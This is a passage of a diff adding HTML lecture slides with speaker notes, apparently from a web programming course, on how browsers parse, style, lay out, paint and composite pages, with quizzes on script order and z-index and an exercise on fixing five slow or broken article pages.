+    <div class="lane"><i class="parse s10">parse (fetch + dependency graph)</i><i class="js s4">run, in order</i><i class="paint s6">DCL</i></div>
+  </div>
+  <ul class="tightlist">
+    <li><code>defer</code>: after parsing, <strong>in document order</strong>, before <code>DOMContentLoaded</code>.</li>
+    <li><code>async</code>: the moment it arrives — any order, may interrupt parsing.</li>
+    <li>Modules are deferred by default; <code>async</code> works on them too.</li>
+  </ul>
+  <aside class="notes">
+    <p>~0:20. Mental rule: <code>defer</code> for your own code that needs the DOM, <code>async</code> only for something standalone that nothing else depends on (an analytics beacon). Inline <code>&lt;script&gt;</code> without <code>src</code> blocks too — and it also waits for any stylesheet already requested, because it might read computed styles. <code>document.write</code> in a script is the worst case: the parser has to splice new bytes into the stream it is already parsing.</p>
+  </aside>
+</section>
+
+<section class="quiz" data-title="Which order?">
+  <p class="kicker">Quick check · predict the console</p>
+  <h2>All three files take 100 ms. What prints first?</h2>
+  <div class="split l2 center">
+<pre class="raw sm">&lt;head&gt;
+  &lt;script src=<span class="s">"a.js"</span> async&gt;&lt;/script&gt;   <span class="c">// logs "a"</span>
+  &lt;script src=<span class="s">"b.js"</span> defer&gt;&lt;/script&gt;   <span class="c">// logs "b"</span>
+  &lt;script src=<span class="s">"c.js"</span>&gt;&lt;/script&gt;         <span class="c">// logs "c"</span>
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;console.log(<span class="s">"inline"</span>)&lt;/script&gt;
+&lt;/body&gt;</pre>
+    <div class="stack">
+      <div class="reveal-box step solid"><code>c</code> → <code>inline</code> → <code>b</code>. <code>a</code> runs whenever it arrives: here near <code>c</code>; on a real network, anywhere.</div>
+      <div class="reveal-box step"><code>c</code> stops the parser, so it runs before the body exists. <code>defer</code> waits for the end of parsing. <code>async</code> races.</div>
+      <div class="reveal-box step">So <code>c.js</code> finds <code>null</code> for any element in the body: a parser-order bug.</div>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~0:22. Have someone commit to an order before revealing. Worth adding: <code>async</code> is a race, so two <code>async</code> scripts that depend on each other break intermittently — the classic "works on my machine, fails on a slow connection" bug. The inline script in the body runs when the parser reaches it, which is why "put your script at the end of the body" worked before <code>defer</code> existed.</p>
+  </aside>
+</section>
+
+<section data-title="The preload scanner">
+  <p class="kicker">A second parser, looking ahead</p>
+  <h2>While one parser is blocked, a second one fetches ahead</h2>
+  <div class="split l2 center">
+    <div class="stack">
+<pre class="raw sm"><span class="c">// the main parser stops here</span>
+&lt;script src=<span class="s">"analytics.js"</span>&gt;&lt;/script&gt;
+
+<span class="c">// the preload scanner reads ahead and</span>
+<span class="c">// starts these anyway:</span>
+&lt;link rel=<span class="s">"stylesheet"</span> href=<span class="s">"article.css"</span>&gt;
+&lt;img src=<span class="s">"hero.jpg"</span>&gt;
+&lt;script src=<span class="s">"comments.js"</span> defer&gt;&lt;/script&gt;</pre>
+<pre class="raw sm"><span class="c">// invisible to it: URLs built at runtime</span>
+hero.src = <span class="s">"/img/hero-"</span> + width + <span class="s">".jpg"</span>;
+<span class="k">new</span> Image().src = pickHero();</pre>
+    </div>
+    <ul>
+      <li>It scans raw bytes for URLs in <code>src</code> and <code>href</code> and queues the fetches early.</li>
+      <li>It is the reason a blocking script hurts less than it should — and the reason a <strong>JavaScript-built URL</strong> is always late.</li>
+      <li>CSS <code>background-image</code> is late too: the URL is only known after the stylesheet is parsed and the element is styled.</li>
+      <li>Fix: put the real URL in the HTML (<code>&lt;img&gt;</code>, <code>srcset</code>) or declare it with <code>&lt;link rel="preload"&gt;</code>.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:24. This is the single most common cause of a slow LCP on an otherwise fine page: the hero image is chosen by a script, so it is discovered a second after everything else. Show it in the Network panel waterfall — the image request starts after the script's. Lazy-loading the hero (<code>loading="lazy"</code> on the first image) has the same effect and is a frequent accident.</p>
+  </aside>
+</section>
+
+<section data-title="CSS blocks rendering">
+  <p class="kicker">Why the screen stays blank</p>
+  <h2>No first paint until the <code>&lt;head&gt;</code> stylesheets arrive</h2>
+  <div class="split l2 center">
+    <div class="stack">
+<pre class="raw sm"><span class="c">// render-blocking</span>
+&lt;link rel=<span class="s">"stylesheet"</span> href=<span class="s">"article.css"</span>&gt;
+
+<span class="c">// not render-blocking: a condition that is false</span>
+&lt;link rel=<span class="s">"stylesheet"</span> href=<span class="s">"print.css"</span>
+      media=<span class="s">"print"</span>&gt;
+
+<span class="c">// a script waits for the stylesheets before it</span>
+&lt;link rel=<span class="s">"stylesheet"</span> href=<span class="s">"slow.css"</span>&gt;
+&lt;script&gt;el.offsetHeight&lt;/script&gt;  <span class="c">// must wait</span></pre>
+      <div class="err">A stylesheet in the body blocks everything after it.</div>
+    </div>
+    <ul>
+      <li>Painting unstyled content and restyling it would flash, so the browser waits.</li>
+      <li>A script may read computed styles, so it waits for pending stylesheets too — a slow CSS file delays your JavaScript.</li>
+      <li><code>media</code> that doesn't match downloads at low priority and doesn't block.</li>
+      <li>Fonts don't block the first paint; they decide what the text <em>looks</em> like, and can shift it.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:26. Demo if there is time: throttle to the 3G preset and watch the white screen for the length of the CSS download. Two numbers worth knowing: a blocking stylesheet on the critical path costs one full round trip, and splitting CSS per route usually beats inlining everything. Modern alternative to the <code>media</code> trick: <code>blocking="render"</code> makes blocking explicit for other elements, but the default for <code>&lt;head&gt;</code> stylesheets stays as described.</p>
+  </aside>
+</section>
+
+<section data-title="Priorities">
+  <p class="kicker">The Network panel's Priority column</p>
+  <h2>The browser guesses an order. You can correct it</h2>
+  <table class="dtable tight">
+    <tr><th>tool</th><th>what it does</th><th>use for</th></tr>
+    <tr><td><code>&lt;link rel="preload"&gt;</code></td><td>fetch now, use later; priority follows <code>as</code></td><td>a font the first paint needs; the LCP image, with <code>fetchpriority="high"</code></td></tr>
+    <tr><td><code>fetchpriority="high"</code></td><td>raise an existing request</td><td>the hero <code>&lt;img&gt;</code> among twenty images</td></tr>
+    <tr><td><code>fetchpriority="low"</code></td><td>lower it</td><td>below-the-fold images, non-critical <code>fetch()</code></td></tr>
+    <tr><td><code>loading="lazy"</code></td><td>don't fetch until it is near the viewport</td><td>images far down the article. <strong>Never</strong> the first one</td></tr>
+    <tr><td><code>&lt;link rel="preconnect"&gt;</code></td><td>DNS + TCP + TLS now, no request</td><td>a known third-party origin (fonts, images CDN)</td></tr>
+    <tr><td>speculation rules, <code>rel="prefetch"</code></td><td>fetch or prerender the <em>next</em> navigation</td><td>the page the reader will click next</td></tr>
+  </table>
+  <p class="muted">Check the result, don't trust the hint: the Priority column and the waterfall tell you whether it worked.</p>
+  <aside class="notes">
+    <p>~0:28. Skip if late. Preload has a cost: a preload that is never used is a wasted download and Chrome warns in the console ("was preloaded using link preload but not used within a few seconds"). Priorities are hints — the browser's own heuristics are good (images in the viewport get raised automatically after layout). The honest workflow is: measure, change one hint, measure again. For the next page, speculation rules (<code>&lt;script type="speculationrules"&gt;</code>) are Chromium's current way to prefetch or prerender; <code>rel="prefetch"</code> is the portable fallback.</p>
+  </aside>
+</section>
+
+<section data-title="Style">
+  <p class="kicker">Stage 2 · from rules to computed styles</p>
+  <h2>Every property of every element gets a value</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// matching: right to left</span>
+<span class="m">.article p &gt; strong</span> { … }
+       <span class="c">↑ start here: is it a strong?</span>
+       <span class="c">then: is the parent a p?</span>
+       <span class="c">then: is an ancestor .article?</span>
+
+<span class="c">// the result, per element</span>
+getComputedStyle(el).color  <span class="c">// "rgb(23, 20, 15)"</span>
+  <span class="c">— no property is ever "unset" here</span></pre>
+    <ul>
+      <li>Selectors are matched <strong>right to left</strong>: the browser starts from the element, so a long descendant chain is cheap to reject.</li>
+      <li>The cascade, inheritance and defaults resolve <em>every</em> property into a <strong>computed style</strong> per element.</li>
+      <li><strong>Invalidation</strong> is scoped: adding a class to one element re-styles that element and its subtree, not the page.</li>
+      <li>Which is why a class toggle on <code>&lt;html&gt;</code> (a theme switch) is the expensive one.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:30. Selector cost is rarely the problem in practice; the number of elements that have to be re-styled is. Blink keeps invalidation sets per rule so a <code>.read</code> class on one paragraph doesn't touch its siblings. Two things that do break it: descendant selectors that depend on an ancestor's state (<code>.dark .card p</code>) and anything matching <code>*</code>. In the Performance panel this is "Recalculate Style", and the row tells you how many elements were affected.</p>
+  </aside>
+</section>
+
+<section data-title="The layout tree">
+  <p class="kicker">Stage 3 · a different tree</p>
+  <h2>The layout tree is not the DOM</h2>
+  <div class="vs2">
+    <div>
+      <h3>the DOM</h3>
+<pre class="raw xs">article
+  h1
+  p.lede
+  p.ad   <span class="c">display: none</span>
+  p        <span class="c">CSS: p::before { content: "§" }</span>
+  span <span class="c">+ text, side by side</span></pre>
+    </div>
+    <div>
+      <h3>the layout tree (boxes)</h3>
+<pre class="raw xs">article    <span class="c">block box</span>
+  h1       <span class="c">block box</span>
+  p.lede   <span class="c">block box</span>
+  <span class="r">— p.ad is absent —</span>
+  p
+    <span class="s">::before</span>  <span class="c">inline box, no DOM node</span>
+  <span class="n">(anonymous block)</span>  <span class="c">invented to hold</span>
+    span, text    <span class="c">inline content</span></pre>
+    </div>
+  </div>
+  <table class="dtable tiny">
+    <tr><th>hiding</th><th>box</th><th>layout cost</th><th>a11y / find-in-page</th></tr>
+    <tr><td><code>display: none</code></td><td class="no">no box at all</td><td>none; re-showing lays out the subtree</td><td>neither</td></tr>
+    <tr><td><code>visibility: hidden</code></td><td class="some">box exists, invisible</td><td>laid out, takes space</td><td>neither</td></tr>
+    <tr><td><code>content-visibility: hidden</code></td><td class="some">box exists, contents skipped</td><td>subtree not styled or laid out until shown</td><td>neither; <code>auto</code> keeps both</td></tr>
+  </table>
+  <aside class="notes">
+    <p>~0:32. Points that pay off later: <code>::before</code> and <code>::after</code> are real boxes with no DOM node, which is why <code>querySelector</code> can't reach them; anonymous boxes are why a stray text node beside a <code>&lt;div&gt;</code> inside a flex container becomes a flex item. <code>content-visibility: auto</code> is the useful one for a long article: off-screen sections skip layout entirely, and you give them <code>contain-intrinsic-size</code> so the scrollbar doesn't jump.</p>
+    <p>If asked about the layout algorithms: each formatting context (block, inline, flex, grid, table) is laid out by its own algorithm. A new block formatting context (<code>display: flow-root</code>) contains floats and stops a first child's <code>margin-top</code> collapsing through a parent with no padding or border. <code>contain: layout paint</code> and <code>container-type</code> are promises that a subtree's changes stay inside it, so the engine can lay it out alone.</p>
+  </aside>
+</section>
+
+<section data-title="Paint is a recording">
+  <p class="kicker">Stage 4 · still no pixels</p>
+  <h2>Paint produces a list of operations, not an image</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// the display list for one card, roughly</span>
+save
+  drawRRect(shadow, blur: 12)
+  drawRRect(rect, radius: 8, <span class="s">#fff</span>)
+  clipRRect(rect)
+  drawImageRect(hero.jpg, src, dst)
+  drawTextBlob(<span class="s">"Council votes on the bridge"</span>, …)
+restore</pre>
+    <ul>
+      <li>The main thread <strong>records</strong> what to draw, in order.</li>
+      <li>Recording is cheap; turning it into pixels (raster) happens elsewhere.</li>
+      <li>The same recording can be re-rastered at a new scale — pinch-zoom without re-running layout.</li>
+      <li>In the Performance panel: "Paint" is the recording, "Rasterize" is the pixels.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:34. Skia is the library doing this in Chromium; the display list is a Skia picture. The useful consequence: "paint" being expensive usually means the list is long or complicated (big blurs, many shadows, large repainted areas), not that the GPU is slow. A box-shadow with a 60px blur over a large area is the classic one, and the Rendering tab's paint flashing shows how much area is re-recorded.</p>
+  </aside>
+</section>
+
+<section data-title="Paint order">
+  <p class="kicker">Who covers whom, with no z-index at all</p>
+  <h2>Paint order inside one stacking context</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="n">1</span>  background and borders of the context's own element
+<span class="n">2</span>  negative <span class="m">z-index</span> stacking contexts
+<span class="n">3</span>  in-flow, non-inline, non-positioned <span class="c">(blocks)</span>
+<span class="n">4</span>  floats
+<span class="n">5</span>  inline content <span class="c">(text, inline boxes)</span>
+<span class="n">6</span>  <span class="m">z-index: 0</span> / auto positioned elements
+<span class="n">7</span>  positive <span class="m">z-index</span> stacking contexts</pre>
+    <ul>
+      <li>Later in the list paints on top. Within one step, <strong>DOM order</strong> decides.</li>
+      <li>So text paints over a float's background, and a positioned element paints over both — with no <code>z-index</code> anywhere.</li>
+      <li>This list repeats <em>inside</em> every stacking context, which is the next slide.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:36. Skip if late; the one line to keep, said on the next slide, is "positioned beats in-flow". Two everyday consequences: a <code>position: relative</code> with no <code>z-index</code> already wins over everything in-flow (step 6 beats step 3), which is why adding <code>position: relative</code> "fixes" an overlap; and two overlapping absolutely positioned siblings are decided purely by source order. Don't make them memorise the seven steps — make them remember that positioned beats in-flow and that order matters within a step.</p>
+  </aside>
+</section>
+
+<section data-title="Stacking contexts">
+  <p class="kicker">A box that takes its children with it</p>
+  <h2>What creates a stacking context</h2>
+  <div class="vs2">
+    <div>
+      <h3>on purpose</h3>
+      <ul class="tightlist">
+        <li><code>position: relative|absolute</code> + a <code>z-index</code> that is not <code>auto</code></li>
+        <li><code>position: fixed</code> or <code>sticky</code> (always)</li>
+        <li><code>isolation: isolate</code></li>
+      </ul>
+    </div>
+    <div>
+      <h3>by accident</h3>
+      <ul class="tightlist">
+        <li><code>opacity</code> less than 1</li>
+        <li><code>transform</code>, <code>filter</code>, <code>backdrop-filter</code>, <code>mix-blend-mode</code>, <code>mask</code>, <code>clip-path</code></li>
+        <li><code>will-change</code> naming any of those</li>
+        <li><code>contain: layout|paint</code>, <code>container-type</code>, a flex/grid item with <code>z-index</code></li>
+      </ul>
+    </div>
+  </div>
+  <p>Inside a stacking context, <code>z-index</code> is <strong>local</strong>: the whole context is painted as one unit in its parent's order.</p>
+  <aside class="notes">
+    <p>~0:38. If Paint order was skipped, say its one line here: positioned beats in-flow, and DOM order breaks ties. The phrase to leave them with: <strong>z-index only competes with its siblings</strong>. <code>opacity: 0.99</code> is a real trick used to force one, and <code>isolation: isolate</code> is the honest way to say "my children's z-indexes stay inside". This slide is the setup for the quiz.</p>
+  </aside>
+</section>
+
+<section class="quiz" data-title="z-index: 1000, still behind">
+  <p class="kicker">Quick check · the article page's header and a dropdown</p>
+  <h2>Why is the dropdown under the header?</h2>
+  <div class="split l2 center">
+    <script type="text/x-code" data-lang="css" class="xs">.header {            /* sticky bar, nothing fancy */
+  position: sticky;
+  top: 0;
+  z-index: 10;
+}
+
+.toolbar {           /* the share bar, fades on scroll */
+  opacity: 0.96;
+}
+
+.toolbar .menu {     /* the dropdown inside it */
+  position: absolute;
+  z-index: 1000;     /* ...and still behind the header */
+}</script>
+    <div class="stack">
+      <div class="reveal-box step solid"><code>opacity: 0.96</code> makes <code>.toolbar</code> a stacking context. <code>z-index: 1000</code> now competes only inside it.</div>
+      <div class="reveal-box step">The whole <code>.toolbar</code> paints as one unit at level 0, under the header's <code>10</code>.</div>
+      <div class="reveal-box step">Fix: remove the <code>opacity</code>, or give <code>.toolbar</code> <code>position: relative; z-index: 11</code>, or make the menu a <code>popover</code> (top layer).</div>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~0:40. Predict first, then show it in Elements: walk up the ancestors in Styles looking for <code>opacity</code>, <code>transform</code> or <code>filter</code> — the <code>opacity</code> on the parent is the culprit. The Layers panel won't show it — a static <code>opacity</code> doesn't get its own layer. The modern escape hatch worth naming: <code>&lt;dialog&gt;</code> with <code>showModal()</code> and <code>popover</code> render in the <strong>top layer</strong>, outside the stacking order entirely — which is why a native popover never has this bug.</p>
+  </aside>
+</section>
+
+<section data-title="Layers">
+  <p class="kicker">Stage 5 begins · DevTools → More tools → Layers</p>
+  <h2>Some boxes get their own layer, which the compositor can move alone</h2>
+  <div class="stackviz">
+    <div class="lyr" aria-hidden="true">
+      <div class="l1">document</div>
+      <div class="l2">video</div>
+      <div class="l3">animated transform</div>
+    </div>
+    <div>
+      <h3>gets a layer</h3>
+      <ul class="tightlist">
+        <li>a <code>transform</code> / <code>opacity</code> animation</li>
+        <li><code>will-change: transform</code></li>
+        <li><code>position: fixed</code>, some <code>sticky</code></li>
+        <li>video, canvas, a 3D transform</li>
+      </ul>
+    </div>
+    <div>
+      <h3>costs</h3>
+      <ul class="tightlist">
+        <li>GPU memory: width × height × 4 bytes, per layer</li>
+        <li>more layers = more work to assemble a frame</li>
+        <li>text in a composited layer can look different</li>
+        <li><code>will-change</code> on everything is the common mistake</li>
+      </ul>
+    </div>
+  </div>
+  <p class="muted">Moving a layer needs no repaint and no layout — the recording is reused, only its position changes.</p>
+  <aside class="notes">
+    <p>~0:42. Open the Layers panel on the demo page: the <code>transform</code> box has its own layer, the <code>left</code> box does not. Rule for <code>will-change</code>: add it shortly before the animation and remove it after, or put it on the handful of elements that really animate. A page with 200 promoted layers is slower than one with none. Chromium's own term for the decision is "compositing reasons", and the Layers panel lists the reason per layer — useful in a debug session.</p>
+  </aside>
+</section>
+
+<section data-title="Raster and decode">
+  <p class="kicker">Where the pixels finally appear</p>
+  <h2>Tiles, raster threads, and the image decode nobody measures</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// a layer is rastered in tiles, off the main thread</span>
+layer (1600 × 4000)
+  → tiles, viewport first
+  → raster threads / GPU
+  → textures the compositor can draw
+
+<span class="c">// a 4000 × 3000 JPEG: decode costs ~50–150 ms</span>
+&lt;img src=<span class="s">"hero.jpg"</span> decoding=<span class="s">"async"</span>&gt;
+
+img.src = url;
+<span class="k">await</span> img.decode();   <span class="c">// decoded, not yet shown</span>
+slot.append(img);    <span class="c">// no flash of empty box</span></pre>
+    <ul>
+      <li>Only the tiles near the viewport are rastered; scrolling fast past un-rastered tiles is what "checkerboarding" is.</li>
+      <li>Image <strong>decoding</strong> is separate from downloading; a synchronous decode holds back the frame that needs the image.</li>
+      <li><code>decoding="async"</code> lets the browser decode off-thread and paint the image a frame later.</li>
+      <li>Serve images at the size they are displayed: decode cost follows the <em>source</em> pixels, not the CSS box.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:44. Skip if late. The practical rule: a 4000px-wide hero shown in an 800px slot is five times the width and 25 times the pixels to decode and hold in memory, and no amount of CSS fixes that — <code>srcset</code> does. <code>img.decode()</code> is the one to reach for when swapping an image in a gallery or a carousel: set <code>src</code>, await <code>decode()</code>, then insert, and the swap never shows a blank. In the Performance panel the decode shows up as "Image Decode" on a raster thread.</p>
+  </aside>
+</section>
+
+<section data-title="The compositor thread">
+  <p class="kicker">Back to the cold open</p>
+  <h2>Scrolling and <code>transform</code> / <code>opacity</code> animations don't need you</h2>
+  <div class="lanes">
+    <div class="lane-name">main thread</div>
+    <div class="lane"><i class="js s9">your 3 s busy loop</i><i class="parse s3">style</i><i class="paint s2">paint</i><i class="idle s6"></i></div>
+    <div class="lane-name">compositor</div>
+    <div class="lane"><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i><i class="paint s2">frame</i></div>
+  </div>
+  <div class="lgnd"><span><em class="js"></em>JavaScript</span><span><em class="parse"></em>style / layout</span><span><em class="paint"></em>frames</span></div>
+  <div class="vs2 mt">
+    <ul class="tightlist">
+      <li><code>left</code>, <code>top</code>, <code>width</code>, <code>margin</code> → layout → <strong>main thread</strong> → frozen with your code.</li>
+      <li><code>requestAnimationFrame</code> runs on the main thread: it freezes too.</li>
+    </ul>
+    <ul class="tightlist">
+      <li><code>transform</code>, <code>opacity</code>, <code>filter</code> on a layer → <strong>compositor</strong> → keeps running.</li>
+      <li>Scrolling is the compositor's too: the page scrolls while your code blocks, and <code>scroll</code> listeners fire late.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:46. Go back to <code>demos/compositor.html</code> and replay the three boxes now that the model is on the board. Name the trade honestly: compositor-only animation means the browser can't recompute layout mid-animation, so what you can animate cheaply is a small set. Web Animations with <code>element.animate()</code> on <code>transform</code> gets the same treatment as a CSS animation; animating in rAF never does. Related: <code>ScrollTimeline</code> moves scroll-driven animations onto the compositor too.</p>
+  </aside>
+</section>
+
+<section data-title="A listener that blocks scrolling">
+  <p class="kicker">The trap that undoes all of it</p>
+  <h2>A non-passive <code>wheel</code> listener makes the compositor wait for you</h2>
+  <div class="split l2 center">
+    <script type="text/x-code" data-lang="js" class="xs">// the compositor can't know if you'll call
+// preventDefault(), so it asks the main thread
+feed.addEventListener("wheel", onWheel);
+  // ↑ blocks the start of every scroll gesture
+feed.addEventListener("wheel", onWheel,
+  { passive: true });   // never blocks
+
+// passive by default only on window, document
+// and body, for wheel / touchstart / touchmove</script>
+    <ul>
+      <li>With a blocking listener, a scroll gesture waits for a busy main thread before it starts, even though the compositor is free.</li>
+      <li><code>{ passive: true }</code> is a promise not to call <code>preventDefault()</code>. Breaking it logs an intervention warning and does nothing else.</li>
+      <li>At the console's Verbose level, Chrome logs <em>"[Violation] Added non-passive event listener to a scroll-blocking 'wheel' event."</em></li>
+      <li>Try it in the demo: pick a listener in the dropdown, click Busy, then scroll the feed.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:48. Do the demo: click "Busy for 3 s" then immediately scroll the feed, with the listener set to <code>none</code>, then to <code>{ passive: true }</code>, then to <code>{ passive: false }</code> — only the last one janks. If a gesture genuinely needs <code>preventDefault</code> (a custom pinch-zoom, a canvas game), you can't be passive; then use <code>touch-action</code> / <code>overscroll-behavior</code> in CSS to tell the compositor up front what not to do.</p>
+  </aside>
+</section>
+
+<section data-title="The Rendering tab">
+  <p class="kicker">DevTools → More tools → Rendering</p>
+  <h2>Four switches that answer "which stage?"</h2>
+  <table class="dtable tight">
+    <tr><th>switch</th><th>shows</th><th>look for</th></tr>
+    <tr><td>Paint flashing</td><td>green flashes over re-painted areas</td><td>a whole-page flash on a small change</td></tr>
+    <tr><td>Layout shift regions</td><td>blue flashes where boxes moved</td><td>anything moving after the first paint</td></tr>
+    <tr><td>Layer borders</td><td>orange borders around composited layers</td><td>no layer on your animation, or hundreds of layers</td></tr>
+    <tr><td>Frame rendering stats</td><td>live frame rate and dropped-frames overlay</td><td>frames dropping while something animates</td></tr>
+  </table>
+  <p class="muted">Also here: emulate <code>prefers-reduced-motion</code>, forced colours and print media. Live LCP / CLS / INP and CPU throttling live in the Performance panel.</p>
+  <aside class="notes">
+    <p>~0:50. These four switches are the whole debugging method for the exercise, so leave the tab open. Paint flashing is the fastest way to find "my hover effect repaints the header": you move the mouse and the entire bar flashes green. Layout shift regions is the only way to catch a shift that happens faster than you can see. For the exercise, pair each switch with the stage it belongs to.</p>
+  </aside>
+</section>
+
+<section data-title="Core Web Vitals">
+  <p class="kicker">What the user actually feels</p>
+  <h2>Three numbers, three stages</h2>
+  <div class="nums grid-3 cards3">
+    <div class="card"><span class="label">LCP · loading</span><div class="num">≤ 2.5 s</div><p>When the biggest element in the viewport appeared. Blocked by: slow TTFB, render-blocking CSS and JS, a late-discovered image.</p></div>
+    <div class="card"><span class="label">INP · responsiveness</span><div class="num">≤ 200 ms</div><p>From an input to the next frame that shows its result. Blocked by: long tasks on the main thread.</p></div>
+    <div class="card"><span class="label">CLS · stability</span><div class="num">≤ 0.1</div><p>How much visible content moved without the user asking. Caused by: layout after the first paint.</p></div>
+  </div>
+  <p>Measured on <strong>real users</strong>, at the 75th percentile. Your laptop on fast wifi is not the measurement.</p>
+  <aside class="notes">
+    <p>~0:52. INP replaced FID in 2024 and is the strict one: it measures the <em>whole</em> interaction, including the frame that paints the result, and it reports close to the worst interaction on the page. The practical fix for INP is always the same shape: break the long task up (<code>await scheduler.yield()</code>, or do the work in a worker) and paint something before the expensive part. Lab tools (Lighthouse) approximate; field data (the Web Vitals library, CrUX) is the truth.</p>
+  </aside>
+</section>
+
+<section data-title="Layout shift">
+  <p class="kicker">The article that jumps three times</p>
+  <h2>Every shift is a layout that happened after a paint</h2>
+  <div class="vs2">
+    <div>
+      <h3>causes</h3>
+      <ul class="tightlist">
+        <li>an image with no <code>width</code> / <code>height</code>: the box is 0 until it loads</li>
+        <li>a web font swapping in at a different size</li>
+        <li>a banner, cookie bar or ad injected <strong>above</strong> the content</li>
+        <li>a late <code>fetch()</code> that replaces a placeholder with taller content</li>
+      </ul>
+    </div>
+    <div>
+      <h3>fixes</h3>
+      <script type="text/x-code" data-lang="css" class="xs">/* reserve the space from the first frame */
+/* <img src="hero.jpg" width="1600" height="900"> */
+img { width: 100%; height: auto }
+.embed { aspect-ratio: 16 / 9 }
+.banner { min-height: 72px }
+.skeleton { height: 120px }  /* the result's height */
+@font-face { font-display: optional }</script>
+    </div>
+  </div>
+  <p class="muted">A shift the user caused (clicking "show more") within 500 ms doesn't count. Everything else does.</p>
+  <aside class="notes">
+    <p>~0:54. <code>width</code> and <code>height</code> attributes on an <code>&lt;img&gt;</code> are not legacy: the browser computes an aspect ratio from them and reserves the box before the bytes arrive. For the injected banner, the honest fix is to reserve the space or put it below the fold; "load it faster" doesn't fix a shift. Layout shift regions in the Rendering tab plus the Performance panel's Experience row give you the culprit element by name.</p>
+  </aside>
+</section>
+
+<section data-title="Fonts">
+  <p class="kicker">Text you can't read vs text that jumps</p>
+  <h2>A font is loading. What should the reader see?</h2>
+  <table class="dtable tight">
+    <tr><th><code>font-display</code></th><th>while loading</th><th>when it arrives</th><th>use for</th></tr>
+    <tr><td><code>auto</code> / <code>block</code></td><td class="no">invisible text (FOIT), up to ~3 s</td><td>swaps in</td><td>almost nothing</td></tr>
+    <tr><td><code>swap</code></td><td class="some">fallback font (FOUT)</td><td>swaps in, may shift</td><td>body text you must be able to read</td></tr>
+    <tr><td><code>fallback</code></td><td class="some">short block, then fallback</td><td>swaps in if it was quick</td><td>a compromise: no late swap</td></tr>
+    <tr><td><code>optional</code></td><td class="yes">fallback, no shift</td><td>only on the next page load</td><td>decorative or body text where CLS matters</td></tr>
+  </table>
+  <p>Match the metrics so the swap doesn't move anything: <code>size-adjust</code> (every engine), plus <code>ascent-override</code> / <code>descent-override</code> where supported, on a local <code>@font-face</code> fallback. Self-host and <code>preload</code> the one font the first paint needs.</p>
+  <aside class="notes">
+    <p>~0:56. Skip if late. The combination that works in practice: self-hosted woff2, <code>font-display: swap</code>, one <code>&lt;link rel="preload"&gt;</code> for the weight used above the fold, and a fallback <code>@font-face</code> with <code>size-adjust</code> tuned so the swap is invisible. <code>size-adjust</code> is the portable part; the override descriptors are not supported everywhere, so verify on caniuse. Subset the font if it carries scripts you don't use. Variable fonts replace four files with one.</p>
+  </aside>
+</section>
+
+<section data-title="Symptom → stage">
+  <p class="kicker">Act 2 on one slide</p>
+  <h2>Read the symptom, name the stage, then measure</h2>
+  <table class="dtable tight">
+    <tr><th>symptom</th><th>stage · thread</th><th>where to look</th></tr>
+    <tr><td>blank screen for seconds</td><td>parse · main</td><td>Network waterfall</td></tr>
+    <tr><td>the hero image is last</td><td>parse · preload scanner</td><td>Network, Priority column</td></tr>
+    <tr><td>content jumps while loading</td><td>layout · main</td><td>Rendering → layout shift regions</td></tr>
+    <tr><td>a click does nothing for 300 ms</td><td>your JavaScript · main</td><td>Performance, long tasks</td></tr>
+    <tr><td>animation stutters</td><td>style / layout / paint · main</td><td>Performance; Rendering → paint flashing</td></tr>
+    <tr><td>a high <code>z-index</code> stays behind</td><td>paint order</td><td>Elements → Styles, up the ancestors</td></tr>
+    <tr><td>scrolling janks</td><td>composite · compositor waiting on main</td><td>console (Verbose); Layers panel</td></tr>
+  </table>
+  <p class="muted">Throttle the CPU as well as the network: a mid-range phone is several times slower than a laptop.</p>
+  <aside class="notes">
+    <p>~0:58. A reference for the exercise: stages and places to look, no causes. Usual causes, for the debrief only: blank screen — render-blocking CSS or a classic script in the head; late hero — URL built in JavaScript or <code>loading="lazy"</code>; jumps — no reserved space, a late font, an injected banner; dead click — a long task between input and frame; stutter — animating <code>left</code>, <code>width</code>, <code>box-shadow</code>; <code>z-index</code> — <code>opacity</code> / <code>transform</code> / <code>filter</code> on an ancestor; scroll jank — a non-passive <code>wheel</code> / <code>touch</code> listener or huge layers. A mid-range Android phone is roughly 4–6× slower than a laptop.</p>
+  </aside>
+</section>
+
+<!-- =====================================================================
+     EXERCISE 1
+     ===================================================================== -->
+
+<section class="exercise" data-act="2" data-act-name="Exercise 1 · Five broken pages" data-at="1:00" data-title="Exercise 1 — Five broken pages">
+  <span class="sticker your-turn">exercise</span>
+  <p class="kicker">Exercise 1 · pairs · 15 min + debrief</p>
+  <div class="ex-head"><h2>Five broken pages</h2><button class="timer" data-min="15"></button></div>
+  <p>Same news article, five copies, one problem each. For each page: <strong>name the stage</strong>, <strong>show the evidence</strong> in DevTools, <strong>fix each cause with one change</strong>, record again.</p>
+  <table class="dtable">
+    <tr><th>#</th><th>symptom</th><th></th></tr>
+    <tr><td>1</td><td>white screen for two seconds</td><td></td></tr>
+    <tr><td>2</td><td>the hero image arrives last</td><td></td></tr>
+    <tr><td>3</td><td>the article jumps three times while loading</td><td></td></tr>
+    <tr><td>4</td><td>the share bar that follows the scroll stutters while the page is busy</td><td class="some">stretch</td></tr>
+    <tr><td>5</td><td>a dropdown with <code>z-index: 1000</code> hides behind the header</td><td class="some">stretch</td></tr>
+  </table>
+  <p class="where mt">12-inside-the-browser → <b><a href="https://lopin.me/harbour/programming-interactivity-12-inside-the-browser/exercises/01-broken-pages/" target="_blank" rel="noopener">Exercise 1 · Five broken pages</a></b></p>
+  <aside class="notes">
